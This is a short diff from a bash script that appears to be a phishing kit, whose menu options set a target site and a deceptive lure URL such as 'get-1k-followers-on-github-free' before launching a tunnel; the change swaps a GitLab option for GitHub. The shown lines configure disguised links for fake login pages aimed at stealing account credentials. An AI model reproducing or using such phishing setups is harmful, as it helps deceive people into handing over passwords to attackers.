@@ -528,8 +528,8 @@ ${WHITE}(${WHITE}15${WHITE})${GREEN} Paypal
 		mask='http://upgrade-your-netflix-plan-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
-		website="gitlab"
-		mask='http://get-1k-followers-on-gitlab-free'
+		website="github"
+		mask='http://get-1k-followers-on-github-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 10 ]]; then
 		website="mediafire"
